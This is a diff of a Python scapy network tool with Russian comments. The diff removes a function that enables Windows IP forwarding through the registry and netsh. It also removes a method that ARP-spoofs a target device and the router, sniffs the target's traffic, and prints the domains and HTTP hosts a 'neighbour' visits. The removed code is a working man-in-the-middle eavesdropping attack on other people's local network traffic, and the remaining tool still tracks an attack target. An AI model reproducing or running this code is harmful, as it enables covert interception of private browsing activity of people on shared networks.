@@ -7,17 +7,10 @@ import ctypes
 from threading import Thread
 from collections import Counter
 from scapy.layers.l2 import ARP, Ether
-from scapy.layers.dns import DNS, DNSQR  # Добавь эту строку
 from scapy.sendrecv import srp, sendp, sniff, send
 from scapy.arch import get_if_addr
 from scapy.all import conf
 from scapy.layers.inet import ICMP, IP
-
-def toggle_forwarding(self, state=True):
-    val = 1 if state else 0
-    # Включаем через реестр и через netsh
-    os.system(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d {val} /f')
-    os.system(f'netsh interface ipv4 set interface "Wi-Fi" forwarding={"enabled" if state else "disabled"}')
 
 
 class NetworkTool:
@@ -119,38 +112,6 @@ class NetworkTool:
                 print(f"[+] Цель вернулась! Новый MAC: {self.target_info['mac']}")
                 return
             time.sleep(1)
-
-    def monitor_process(self):
-        t_ip = self.target_info['ip']
-        t_mac = self.target_info['mac']
-
-        # Включаем пересылку, чтобы интернет у него НЕ пропадал
-        self.toggle_forwarding(True)
-
-        # Пакеты с ТВОИМ реальным MAC (чтобы пакеты возвращались к тебе)
-        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, psrc=self.router_ip)
-        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, psrc=t_ip)
-
-        print(f"[*] РЕЖИМ ПРОСЛУШКИ: {t_ip} под наблюдением...")
-
-        def packet_callback(pkt):
-            if pkt.haslayer(DNSQR):  # Читаем DNS запросы (сайты)
-                site = pkt[DNSQR].qname.decode()
-                print(f"[DNS] Сосед заходит на: {site}")
-            elif pkt.haslayer(IP) and pkt.haslayer("Raw"):  # Пытаемся поймать HTTP
-                load = str(pkt["Raw"].load)
-                if "Host:" in load:
-                    host = load.split("Host: ")[1].split("\\r\\n")[0]
-                    print(f"[HTTP] Открыт хост: {host}")
-
-        # Запускаем сниффер в отдельном потоке внутри этого процесса
-        sniff_thread = Thread(target=lambda: sniff(filter=f"host {t_ip}", prn=packet_callback, store=0), daemon=True)
-        sniff_thread.start()
-
-        while self.is_attacking:
-            sendp(to_v, verbose=False)
-            sendp(to_r, verbose=False)
-            time.sleep(1)  # Здесь спамить часто не нужно, достаточно поддерживать связь
 
 
 def clear_screen():
